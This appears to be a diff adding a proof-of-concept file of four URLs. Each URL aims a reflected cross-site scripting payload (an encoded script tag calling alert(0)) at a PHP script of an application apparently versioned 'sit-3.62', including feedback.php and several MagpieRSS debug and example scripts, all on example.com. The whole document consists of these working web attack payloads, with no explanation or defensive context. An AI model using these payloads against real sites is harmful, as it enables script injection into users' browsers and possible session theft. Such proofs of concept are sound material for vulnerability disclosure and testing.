@@ -1,0 +1,4 @@
+http://www.example.com/sit-3.62/feedback.php?ax=--%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_simple.php?url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_slashbox.php?rss_url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E
